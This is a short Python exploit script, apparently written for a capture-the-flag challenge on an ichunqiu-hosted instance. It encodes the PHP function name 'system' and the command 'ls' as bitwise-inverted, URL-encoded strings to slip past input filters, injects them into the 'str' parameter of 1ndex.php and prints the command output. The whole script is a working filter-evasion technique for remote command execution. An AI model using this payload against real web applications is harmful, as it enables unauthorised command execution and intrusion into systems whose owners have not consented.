import requests


def inv_code(txt):
    if not txt: return ''
    r = '~' + ''.join(f'%{~x & 0xff:x}' for x in txt.encode())
    return r


url = 'http://eci-2zegyjtjnfxjekbwglx4.cloudeci1.ichunqiu.com/1ndex.php?str=${%s}'

system = inv_code('system')
ls = inv_code('ls')
payload1 = f'({system})({ls})'
print(payload1)
res = requests.get(url % payload1)
print(res.text)
